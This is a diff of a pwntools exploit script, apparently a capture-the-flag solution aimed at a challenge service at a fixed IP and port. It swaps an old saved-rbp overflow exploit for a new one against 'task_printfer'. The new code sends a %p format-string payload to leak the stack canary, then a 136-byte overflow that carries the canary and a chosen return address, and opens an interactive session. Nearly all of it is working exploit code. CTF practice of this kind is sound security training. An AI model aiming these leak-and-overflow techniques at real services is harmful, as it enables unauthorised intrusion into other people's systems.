@@ -1,63 +1,57 @@
 #!/usr/bin/env python3
 from pwn import *
 
-# Set up pwntools for the correct architecture
-exe = context.binary = ELF('rbp')
+exe = context.binary = ELF('task_printfer')
 
 host = args.HOST or '109.233.56.90'
-port = int(args.PORT or 11606)
+port = int(args.PORT or 11589)
 
 def start_local(argv=[], *a, **kw):
-    '''Execute the target binary locally'''
     if args.GDB:
         return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
     else:
         return process([exe.path] + argv, *a, **kw)
 
 def start_remote(argv=[], *a, **kw):
-    '''Connect to the process on the remote host'''
     io = connect(host, port)
     if args.GDB:
         gdb.attach(io, gdbscript=gdbscript)
     return io
 
 def start(argv=[], *a, **kw):
-    '''Start the exploit against the target.'''
     if args.LOCAL:
         return start_local(argv, *a, **kw)
     else:
         return start_remote(argv, *a, **kw)
 
-# Specify your GDB script here for debugging
-# GDB will be launched if the exploit is run via e.g.
-# ./exploit.py GDB
-gdbscript = '''
-tbreak main
-continue
-'''.format(**locals())
-
 #===========================================================
 #                    EXPLOIT GOES HERE
 #===========================================================
+# Arch:     amd64-64-little
+# RELRO:    Partial RELRO
+# Stack:    Canary found
+# NX:       NX enabled
+# PIE:      No PIE (0x400000)
 
 io = start()
 
-# 0x401162		-	win()
+io.recvuntil(b'Say your name:\n')
+pl = b"AAAABBBB%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p"
+io.sendline(pl)
 
-# 0x4000800c68	-	"message"
-# 0x4000800c70	-	rbp
-# 0x4000800c78	-	ret
+io.recvuntil(b'Welcome, ')
+stack = io.recvuntil(b'!\n')[:-2]
+stack = stack.split(b"0x")
 
-# 0x405080		-	buf2
+canary = int(stack[14].strip(b"(nil)"), 16)
 
-io.recvuntil(b"Let's overflow saved rbp! reading 16 bytes:\n")
-pl = 8 * b"a"
-pl += p64(0x405080 - 0x8)
-io.send(pl)
+pl = cyclic(136)
+pl += p64(canary)
+pl += p64(0xdead)
+pl += p64(0x400885)
 
-io.recvuntil(b"Let's prepare some handy buffer! reading 8 bytes:\n")
-pl = p64(0x401162)
-io.send(pl)
+io.recvuntil(b'Now enter your message:\n')
+io.sendline(pl)
 
 io.interactive()
 
